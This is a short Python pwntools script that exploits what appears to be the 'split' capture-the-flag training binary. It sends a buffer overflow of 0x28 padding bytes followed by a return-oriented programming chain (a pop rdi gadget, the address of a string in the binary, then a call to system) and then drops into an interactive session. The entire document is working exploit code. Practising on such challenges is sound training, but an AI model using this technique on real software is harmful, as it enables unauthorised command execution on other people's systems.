from pwn import *

# file information here

executable = 'split'
gdbinit = 'b *0x400740'

elf = ELF(executable)
libc = elf.libc 

rop = ROP([elf, libc])

p = process(elf.path)

# gdb.attach(p, gdbscript=gdbinit)

p.recvuntil("")

payload = b''
payload += b'a'*0x28
payload += p64(0x00000000004007c3) # pop rdi
payload += p64(0x601060) # useful strings
payload += p64(0x400560) # call system

pause()
p.send(payload)

p.interactive()

# with open('out.txt', 'wb') as out:
    # out.write(payload)
